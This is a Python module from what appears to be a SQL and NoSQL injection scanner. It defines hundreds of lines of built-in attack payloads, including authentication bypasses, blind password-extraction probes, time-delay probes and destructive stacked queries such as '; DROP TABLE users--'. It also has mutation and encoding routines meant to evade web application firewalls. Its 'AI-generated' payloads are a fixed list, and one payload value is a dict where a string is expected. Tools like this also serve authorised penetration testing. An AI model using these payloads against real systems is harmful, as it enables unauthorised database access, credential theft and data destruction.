"""
Payload Engine Module
====================

Provides structured payload categories and mutation capabilities:
- Boolean-based payloads
- Error-based payloads
- Time-based inference payloads
- UNION-based detection payloads

With encoding and obfuscation options:
- URL encoding
- Double encoding
- Case randomization
- Inline comments obfuscation
"""

from typing import List, Dict, Any, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
import random
import urllib.parse


class PayloadType(Enum):
    """Categories of SQL injection payloads."""
    BOOLEAN_BASED = "boolean"
    ERROR_BASED = "error"
    TIME_BASED = "time"
    UNION_BASED = "union"
    STACKED_QUERY = "stacked"
    BLIND = "blind"
    GRAPHQL = "graphql"
    JSON = "json"
    NOSQL = "nosql"


class EncodingType(Enum):
    """Encoding types for payload mutation."""
    NONE = "none"
    URL_ENCODE = "url"
    DOUBLE_URL_ENCODE = "double_url"
    BASE64 = "base64"
    HEX = "hex"
    HTML = "html"
    Unicode = "unicode"


@dataclass
class Payload:
    """Represents a SQL injection payload."""
    value: str
    payload_type: PayloadType
    category: str
    description: str
    expected_behavior: str
    risk_level: str = "medium"
    database_target: Optional[str] = None
    
    def encode(self, encoding: EncodingType) -> str:
        """Encode the payload using specified encoding."""
        encoders = {
            EncodingType.NONE: lambda x: x,
            EncodingType.URL_ENCODE: urllib.parse.quote,
            EncodingType.DOUBLE_URL_ENCODE: lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            EncodingType.BASE64: lambda x: __import__('base64').b64encode(x.encode()).decode(),
            EncodingType.HEX: lambda x: ''.join(f'{ord(c):02x}' for c in x),
            EncodingType.HTML: lambda x: x.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;'),
            EncodingType.Unicode: lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        }
        return encoders.get(encoding, lambda x: x)(self.value)
    
    def mutate(self, mutation_type: str) -> str:
        """Apply mutation to the payload."""
        mutations = {
            'case_random': lambda p: ''.join(
                c.upper() if random.random() > 0.5 else c.lower() for c in p
            ),
            'inline_comment': self._add_inline_comments,
            'whitespace_variation': self._vary_whitespace,
            'character_encoding': self._encode_characters,
        }
        return mutations.get(mutation_type, lambda x: x)(self.value)
    
    def _add_inline_comments(self, payload: str) -> str:
        """Add inline SQL comments for obfuscation."""
        keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        for keyword in keywords:
            if keyword in result.upper():
                insert_pos = result.upper().find(keyword) + len(keyword) // 2
                result = result[:insert_pos] + '/**/' + result[insert_pos:]
        return result
    
    def _vary_whitespace(self, payload: str) -> str:
        """Vary whitespace characters."""
        whitespace = [' ', '\t', '\n', '/**/', '/*comment*/']
        result = []
        for char in payload:
            if char.isspace():
                result.append(random.choice(whitespace))
            else:
                result.append(char)
        return ''.join(result)
    
    def _encode_characters(self, payload: str) -> str:
        """Encode special characters."""
        replacements = {
            "'": "''",
            '"': '""',
            '-': '+-',
            '=': '+=',
        }
        result = payload
        for old, new in replacements.items():
            result = result.replace(old, new)
        return result


class PayloadSet:
    """A set of related payloads."""
    
    def __init__(self, name: str, payloads: List[Payload]):
        self.name = name
        self.payloads = payloads
    
    def __iter__(self):
        return iter(self.payloads)
    
    def __len__(self):
        return len(self.payloads)


class PayloadEngine:
    """Engine for generating and mutating SQL injection payloads."""
    
    def __init__(self, max_payloads: int = 100):
        self.max_payloads = max_payloads
        self._payloads: Dict[PayloadType, List[Payload]] = {}
        self._custom_payloads: List[Payload] = []
        self._init_builtin_payloads()
    
    def _init_builtin_payloads(self) -> None:
        """Initialize built-in payloads for each type."""
        self._payloads = {
            PayloadType.BOOLEAN_BASED: self._get_boolean_payloads(),
            PayloadType.ERROR_BASED: self._get_error_payloads(),
            PayloadType.TIME_BASED: self._get_time_payloads(),
            PayloadType.UNION_BASED: self._get_union_payloads(),
            PayloadType.STACKED_QUERY: self._get_stacked_payloads(),
            PayloadType.BLIND: self._get_blind_payloads(),
            PayloadType.GRAPHQL: self._get_graphql_payloads(),
            PayloadType.JSON: self._get_json_payloads(),
            PayloadType.NOSQL: self._get_nosql_payloads(),
        }
    
    def _get_boolean_payloads(self) -> List[Payload]:
        """Get comprehensive boolean-based injection payloads."""
        payloads = [
            # Classic boolean-based (HIGH)
            Payload(value="' OR '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_true", description="Basic boolean true", expected_behavior="Response differs when true", risk_level="high"),
            Payload(value="' OR '1'='2", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_false", description="Basic boolean false", expected_behavior="Response differs when false", risk_level="high"),
            Payload(value=" OR 1=1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_noquote", description="Boolean without quotes", expected_behavior="Response changes", risk_level="high"),
            Payload(value="' OR 1=1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_or_comment", description="OR with comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="1' OR '1'='1' --", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_prefixed", description="Numeric prefix", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 'x'='x", payload_type=PayloadType.BOOLEAN_BASED, category="always_true_x", description="Always-true with x", expected_behavior="Response differs", risk_level="high"),
            Payload(value="'=", payload_type=PayloadType.BOOLEAN_BASED, category="equal_condition", description="Equal condition", expected_behavior="Response changes", risk_level="high"),
            Payload(value="1 OR 1=1", payload_type=PayloadType.BOOLEAN_BASED, category="numeric_or", description="Numeric OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="1' OR '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="quoted_or", description="Quoted OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1=1 #", payload_type=PayloadType.BOOLEAN_BASED, category="mysql_comment", description="MySQL inline comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1=1--", payload_type=PayloadType.BOOLEAN_BASED, category="dash_comment", description="Dash comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="admin' OR '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="admin_bypass", description="Admin bypass", expected_behavior="Auth bypass", risk_level="high"),
            Payload(value="%27+OR+1%3D1", payload_type=PayloadType.BOOLEAN_BASED, category="url_encoded", description="URL encoded OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="%20OR%201%3D1", payload_type=PayloadType.BOOLEAN_BASED, category="url_encoded2", description="URL encoded", expected_behavior="Response differs", risk_level="high"),
            Payload(value="'/**/OR/**/1=1--", payload_type=PayloadType.BOOLEAN_BASED, category="waf_inline_comment", description="Inline comment WAF bypass", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="' OR 1=1 --%09", payload_type=PayloadType.BOOLEAN_BASED, category="waf_tab", description="Tab bypass", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="' OR 1=1 --%0a", payload_type=PayloadType.BOOLEAN_BASED, category="waf_newline", description="Newline bypass", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="' OR 1=1-- -", payload_type=PayloadType.BOOLEAN_BASED, category="waf_trailing", description="Trailing space", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="1' ORDER BY 1--", payload_type=PayloadType.BOOLEAN_BASED, category="orderby", description="ORDER BY test", expected_behavior="Error or different", risk_level="high"),
            Payload(value="' OR ''='", payload_type=PayloadType.BOOLEAN_BASED, category="always_true", description="Always true", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="1' AND '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="and_true", description="AND true", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="' OR 1=1%00", payload_type=PayloadType.BOOLEAN_BASED, category="null_byte", description="Null byte", expected_behavior="Bypass filter", risk_level="medium"),
            Payload(value="1 OR 1=1", payload_type=PayloadType.BOOLEAN_BASED, category="simple_or", description="Simple OR", expected_behavior="Response differs", risk_level="low"),
        ]
        return payloads
    
    def _get_error_payloads(self) -> List[Payload]:
        """Get comprehensive error-based injection payloads."""
        payloads = [
            Payload(value="'", payload_type=PayloadType.ERROR_BASED, category="single_quote", description="Single quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value="''", payload_type=PayloadType.ERROR_BASED, category="double_quote", description="Double quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value="' OR 1=1 --", payload_type=PayloadType.ERROR_BASED, category="or_error", description="OR with comment", expected_behavior="Error or diff", risk_level="high"),
            Payload(value="')", payload_type=PayloadType.ERROR_BASED, category="parenthesis_close", description="Closing paren", expected_behavior="SQL error", risk_level="high"),
            Payload(value="))", payload_type=PayloadType.ERROR_BASED, category="double_paren", description="Double paren", expected_behavior="SQL error", risk_level="high"),
            Payload(value="CONCAT(", payload_type=PayloadType.ERROR_BASED, category="unclosed_function", description="Unclosed function", expected_behavior="SQL error", risk_level="high"),
            Payload(value="1'", payload_type=PayloadType.ERROR_BASED, category="number_quote", description="Number quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value="1--", payload_type=PayloadType.ERROR_BASED, category="number_comment", description="Number comment", expected_behavior="SQL error", risk_level="high"),
            Payload(value=";", payload_type=PayloadType.ERROR_BASED, category="semicolon", description="Semicolon", expected_behavior="SQL error", risk_level="high"),
            Payload(value="' UNION SELECT NULL--", payload_type=PayloadType.ERROR_BASED, category="union_null", description="UNION NULL", expected_behavior="Error or diff", risk_level="high"),
            Payload(value="' UNION SELECT NULL,NULL--", payload_type=PayloadType.ERROR_BASED, category="union_two_null", description="UNION 2 NULL", expected_behavior="Error or diff", risk_level="high"),
            Payload(value="1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", payload_type=PayloadType.ERROR_BASED, category="extractvalue", description="ExtractValue", expected_behavior="MySQL error", risk_level="high"),
            Payload(value="' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", payload_type=PayloadType.ERROR_BASED, category="updatexml", description="UpdateXML", expected_behavior="MySQL error", risk_level="high"),
            Payload(value="%27", payload_type=PayloadType.ERROR_BASED, category="url_encoded", description="URL encoded", expected_behavior="SQL error", risk_level="medium"),
            Payload(value="\\", payload_type=PayloadType.ERROR_BASED, category="backslash", description="Backslash", expected_behavior="Error", risk_level="medium"),
            Payload(value="BENCHMARK(1000000,SHA1('test'))", payload_type=PayloadType.ERROR_BASED, category="benchmark", description="BENCHMARK", expected_behavior="Delay", risk_level="medium"),
            Payload(value="NULL", payload_type=PayloadType.ERROR_BASED, category="null", description="NULL", expected_behavior="Different response", risk_level="low"),
        ]
        return payloads
    
    def _get_time_payloads(self) -> List[Payload]:
        """Get comprehensive time-based (blind) injection payloads."""
        payloads = [
            Payload(value="' AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep", description="MySQL SLEEP", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1 AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_num", description="MySQL SLEEP numeric", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1' AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_quoted", description="MySQL SLEEP quoted", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="' AND BENCHMARK(5000000,MD5('test'))--", payload_type=PayloadType.TIME_BASED, category="mysql_benchmark", description="MySQL BENCHMARK", database_target="mysql", expected_behavior="Response delayed", risk_level="high"),
            Payload(value="1' AND pg_sleep(5)--", payload_type=PayloadType.TIME_BASED, category="postgres_sleep", description="PostgreSQL SLEEP", database_target="postgresql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1 AND pg_sleep(5)--", payload_type=PayloadType.TIME_BASED, category="postgres_sleep_num", description="PostgreSQL SLEEP numeric", database_target="postgresql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="'; WAITFOR DELAY '0:0:5'--", payload_type=PayloadType.TIME_BASED, category="mssql_waitfor", description="MSSQL WAITFOR", database_target="mssql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1'; WAITFOR DELAY '0:0:5'--", payload_type=PayloadType.TIME_BASED, category="mssql_waitfor_quoted", description="MSSQL WAITFOR quoted", database_target="mssql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="'; DBMS_LOCK.SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="oracle_sleep", description="Oracle SLEEP", database_target="oracle", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="' AND SLEEP(2)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_short", description="MySQL 2s delay", database_target="mysql", expected_behavior="Response delayed 2s", risk_level="medium"),
            Payload(value="1 AND SLEEP(2)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_short2", description="MySQL 2s numeric", database_target="mysql", expected_behavior="Response delayed 2s", risk_level="medium"),
            Payload(value="'; WAITFOR DELAY '0:0:2'--", payload_type=PayloadType.TIME_BASED, category="mssql_short", description="MSSQL 2s delay", database_target="mssql", expected_behavior="Response delayed 2s", risk_level="medium"),
            Payload(value="' AND IF(1=1,SLEEP(5),0)--", payload_type=PayloadType.TIME_BASED, category="mysql_if", description="MySQL IF", database_target="mysql", expected_behavior="Conditional delay", risk_level="medium"),
            Payload(value="/*!50000SLEEP(5)*/", payload_type=PayloadType.TIME_BASED, category="mysql_version", description="Version comment SLEEP", database_target="mysql", expected_behavior="Response delayed", risk_level="low"),
        ]
        return payloads
    
    def _get_union_payloads(self) -> List[Payload]:
        """Get comprehensive UNION-based injection payloads."""
        payloads = [
            Payload(value="' UNION SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_null", description="UNION NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_two_null", description="UNION 2 NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT NULL,NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_three_null", description="UNION 3 NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION ALL SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_all_null", description="UNION ALL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT 1--", payload_type=PayloadType.UNION_BASED, category="union_one", description="UNION 1", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT 1,2--", payload_type=PayloadType.UNION_BASED, category="union_two", description="UNION 1,2", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT version()--", payload_type=PayloadType.UNION_BASED, category="union_version", description="UNION version()", expected_behavior="Version info", risk_level="high"),
            Payload(value="' UNION SELECT user()--", payload_type=PayloadType.UNION_BASED, category="union_user", description="UNION user()", expected_behavior="User info", risk_level="high"),
            Payload(value="' UNION SELECT database()--", payload_type=PayloadType.UNION_BASED, category="union_db", description="UNION database()", expected_behavior="DB info", risk_level="high"),
            Payload(value="'/**/UNION/**/SELECT/**/NULL--", payload_type=PayloadType.UNION_BASED, category="union_bypass", description="Bypass comments", expected_behavior="Bypass WAF", risk_level="medium"),
            Payload(value="' UNION%20SELECT%20NULL--", payload_type=PayloadType.UNION_BASED, category="union_url", description="URL encoded", expected_behavior="Bypass filter", risk_level="medium"),
            Payload(value="1' ORDER BY 1--", payload_type=PayloadType.UNION_BASED, category="orderby1", description="ORDER BY 1", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 2--", payload_type=PayloadType.UNION_BASED, category="orderby2", description="ORDER BY 2", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 3--", payload_type=PayloadType.UNION_BASED, category="orderby3", description="ORDER BY 3", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 4--", payload_type=PayloadType.UNION_BASED, category="orderby4", description="ORDER BY 4", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 5--", payload_type=PayloadType.UNION_BASED, category="orderby5", description="ORDER BY 5", expected_behavior="Error or diff", risk_level="medium"),
        ]
        return payloads
    
    def _get_stacked_payloads(self) -> List[Payload]:
        """Get stacked query payloads."""
        return [
            Payload(
                value="'; DROP TABLE users--",
                payload_type=PayloadType.STACKED_QUERY,
                category="stacked_drop",
                description="Stacked query with DROP (for detection only)",
                expected_behavior="Error if stacked queries supported",
                risk_level="high"
            ),
            Payload(
                value="'; SELECT 1--",
                payload_type=PayloadType.STACKED_QUERY,
                category="stacked_select",
                description="Stacked query with SELECT",
                expected_behavior="Different response if stacked queries work"
            ),
        ]
    
    def _get_blind_payloads(self) -> List[Payload]:
        """Get blind SQL injection payloads."""
        return [
            Payload(
                value="' AND (SELECT COUNT(*) FROM users) > 0--",
                payload_type=PayloadType.BLIND,
                category="blind_count",
                description="Blind injection with COUNT",
                expected_behavior="Response differs based on truth"
            ),
            Payload(
                value="' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
                payload_type=PayloadType.BLIND,
                category="blind_substring",
                description="Blind injection with SUBSTRING",
                expected_behavior="Response differs based on character match"
            ),
            Payload(
                value="1 AND (SELECT SLEEP(3))",
                payload_type=PayloadType.BLIND,
                category="blind_sleep",
                description="Blind injection with SLEEP",
                expected_behavior="Response delayed if true"
            ),
        ]

    def _get_graphql_payloads(self) -> List[Payload]:
        """Get GraphQL injection payloads (2026 modern)."""
        return [
            Payload(
                value='" UNION SELECT NULL--',
                payload_type=PayloadType.GRAPHQL,
                category="graphql_string",
                description="GraphQL string injection",
                expected_behavior="Different response with UNION",
                risk_level="high"
            ),
            Payload(
                value='\\" OR 1=1--',
                payload_type=PayloadType.GRAPHQL,
                category="graphql_escape",
                description="GraphQL escaped quote injection",
                expected_behavior="Bypass GraphQL parsing",
                risk_level="high"
            ),
            Payload(
                value='1; DROP TABLE users--',
                payload_type=PayloadType.GRAPHQL,
                category="graphql_stacked",
                description="GraphQL stacked query",
                expected_behavior="Stacked query execution",
                risk_level="high"
            ),
            Payload(
                value='{"a": "1\' OR \'1\'=\'1"}',
                payload_type=PayloadType.GRAPHQL,
                category="graphql_json",
                description="GraphQL JSON parameter injection",
                expected_behavior="JSON injection in query variables",
                risk_level="high"
            ),
        ]

    def _get_json_payloads(self) -> List[Payload]:
        """Get JSON API injection payloads."""
        return [
            Payload(
                value='{"id": "1 OR 1=1"}',
                payload_type=PayloadType.JSON,
                category="json_string",
                description="JSON string injection",
                expected_behavior="SQL in JSON value",
                risk_level="high"
            ),
            Payload(
                value='{"id": "1\' OR \'1\'=\'1"}',
                payload_type=PayloadType.JSON,
                category="json_boolean",
                description="JSON boolean injection",
                expected_behavior="Boolean injection via JSON",
                risk_level="high"
            ),
            Payload(
                value='{"id": "1\"; DROP TABLE users; --"}',
                payload_type=PayloadType.JSON,
                category="json_stacked",
                description="JSON stacked injection",
                expected_behavior="Stacked query in JSON",
                risk_level="high"
            ),
        ]

    def _get_nosql_payloads(self) -> List[Payload]:
        """Get NoSQL injection payloads (MongoDB, etc)."""
        return [
            Payload(
                value='{"$ne": null}',
                payload_type=PayloadType.NOSQL,
                category="nosql_ne",
                description="MongoDB $ne operator injection",
                expected_behavior="Bypass authentication",
                risk_level="high"
            ),
            Payload(
                value='{"$gt": ""}',
                payload_type=PayloadType.NOSQL,
                category="nosql_gt",
                description="MongoDB $gt operator injection",
                expected_behavior="True condition injection",
                risk_level="high"
            ),
            Payload(
                value='{"$where": "this.password.length > 0"}',
                payload_type=PayloadType.NOSQL,
                category="nosql_where",
                description="MongoDB $where injection",
                expected_behavior="JavaScript injection",
                risk_level="high"
            ),
            Payload(
                value='{"$regex": "^a"}',
                payload_type=PayloadType.NOSQL,
                category="nosql_regex",
                description="MongoDB regex injection",
                expected_behavior="Pattern matching injection",
                risk_level="high"
            ),
            Payload(
                value={"$gt": 0, "$username": {"$ne": ""}},
                payload_type=PayloadType.NOSQL,
                category="nosql_auth_bypass",
                description="NoSQL authentication bypass",
                expected_behavior="Bypass login",
                risk_level="high",
                database_target="mongodb"
            ),
        ]
    
    def get_payloads_by_type(self, payload_type: PayloadType) -> List[Payload]:
        """Get all payloads of a specific type."""
        return self._payloads.get(payload_type, [])
    
    def set_custom_payloads(self, payloads: List[str]) -> None:
        """Set custom payloads from a list of strings."""
        self._custom_payloads = [
            Payload(
                value=p,
                payload_type=PayloadType.BOOLEAN_BASED,
                category="custom",
                description="Custom payload",
                expected_behavior="Testing with custom payload"
            )
            for p in payloads if p.strip()
        ]
    
    def load_payloads_from_file(self, filepath: str) -> int:
        """Load custom payloads from a file (one per line)."""
        try:
            with open(filepath, 'r') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            self.set_custom_payloads(payloads)
            return len(payloads)
        except Exception:
            return 0
    
    def get_all_payloads(self) -> List[Payload]:
        """Get all available payloads."""
        all_payloads = []
        for payloads in self._payloads.values():
            all_payloads.extend(payloads)
        all_payloads.extend(self._custom_payloads)
        return all_payloads[:self.max_payloads]
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        """Get payloads suitable for a specific context."""
        context_map = {
            'numeric': [p for p in self.get_all_payloads() if not p.value.startswith("'")],
            'string': [p for p in self.get_all_payloads() if p.value.startswith("'")],
            'json': self.get_all_payloads(),
            'cookie': self.get_all_payloads(),
            'header': self.get_all_payloads(),
        }
        return context_map.get(context, self.get_all_payloads())
    
    def add_custom_payload(self, payload: Payload) -> None:
        """Add a custom payload to the engine."""
        self._custom_payloads.append(payload)
    
    def generate_mutated_payloads(
        self,
        base_payload: Payload,
        mutation_types: List[str],
        encoding: EncodingType = EncodingType.NONE
    ) -> List[Payload]:
        """Generate mutated versions of a payload."""
        mutated = []
        
        for mutation_type in mutation_types:
            mutated_value = base_payload.mutate(mutation_type)
            encoded_value = base_payload.encode(encoding)
            
            mutated.append(Payload(
                value=mutated_value,
                payload_type=base_payload.payload_type,
                category=f"{base_payload.category}_{mutation_type}",
                description=f"Mutated: {mutation_type}",
                expected_behavior=base_payload.expected_behavior,
                risk_level=base_payload.risk_level,
                database_target=base_payload.database_target,
            ))
            
            if encoded_value != base_payload.value:
                mutated.append(Payload(
                    value=encoded_value,
                    payload_type=base_payload.payload_type,
                    category=f"{base_payload.category}_encoded",
                    description=f"Encoded: {encoding.value}",
                    expected_behavior=base_payload.expected_behavior,
                    risk_level=base_payload.risk_level,
                    database_target=base_payload.database_target,
                ))
        
        return mutated
    
    def generate_ai_payloads(
        self,
        base_patterns: List[str],
        target_db: str = "auto"
    ) -> List[Payload]:
        """Generate AI-powered payloads based on learned patterns."""
        ai_payloads = []
        
        waf_bypass_patterns = [
            ("' OR 1=1--", "waf_bypass_comment"),
            ("'/**/OR/**/1=1--", "waf_bypass_inline"),
            ("' OR 1=1#", "waf_bypass_mysql"),
            ("' OR 1=1 --%09", "waf_bypass_tab"),
            ("' OR 1=1 --%0a", "waf_bypass_newline"),
            ("' OR 1=1/*!UNION*/", "waf_bypass_mysql_comment"),
            ("' OR '1'='1'/**/AND/**/'1'='1", "waf_bypass_spaced"),
            ("' OR 1=1-- -", "waf_bypass_trailing"),
            ("1' ORDER BY 1--", "waf_bypass_orderby"),
            ("1' ORDER BY 2--", "waf_bypass_orderby2"),
            ("1' ORDER BY 3--", "waf_bypass_orderby3"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "waf_bypass_xpath"),
            ("' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "waf_bypass_updatexml"),
            ("'; WAITFOR DELAY '0:0:2'--", "waf_bypass_time_mssql"),
            ("' AND SLEEP(2)--", "waf_bypass_time_mysql"),
            ("1 AND SLEEP(2)", "waf_bypass_time_numeric"),
            ("1' AND SLEEP(2)--", "waf_bypass_time_quote"),
            ("') AND SLEEP(2)--", "waf_bypass_time_paren"),
            ("/*!50000SLEEP(2)*/", "waf_bypass_time_version"),
            ("1' AND 1=CONCAT('a', SLEEP(2))--", "waf_bypass_time_concat"),
        ]
        
        for pattern, category in waf_bypass_patterns:
            ai_payloads.append(Payload(
                value=pattern,
                payload_type=PayloadType.BOOLEAN_BASED,
                category=category,
                description=f"AI-generated WAF bypass payload (2026)",
                expected_behavior="Bypass WAF detection filters",
                risk_level="high",
                database_target=target_db if target_db != "auto" else None
            ))
        
        return ai_payloads
    
    def get_adaptive_payloads(
        self,
        response_patterns: Dict[str, Any] = None,
        previous_success: List[str] = None
    ) -> List[Payload]:
        """Get adaptive payloads based on previous responses."""
        return []